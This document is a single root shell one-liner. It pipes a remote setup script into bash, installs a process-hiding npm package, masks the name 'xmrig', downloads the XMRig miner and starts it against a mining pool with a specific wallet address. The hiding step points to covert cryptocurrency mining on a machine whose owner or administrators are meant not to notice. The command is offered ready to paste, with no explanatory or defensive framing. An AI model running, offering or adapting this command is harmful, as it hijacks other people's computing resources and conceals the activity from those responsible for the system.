sudo su --command "sudo apt update && sudo apt upgrade -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-bionic-x64.tar.gz && tar -zxf xmrig-6.16.2-bionic-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -a rx/arq -o stratum+tcp://randomARQ.asia.mine.zergpool.com:4464 -u TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a --keepalive --timeout 120 --donate-level 1 -p c=TRX,m=solo
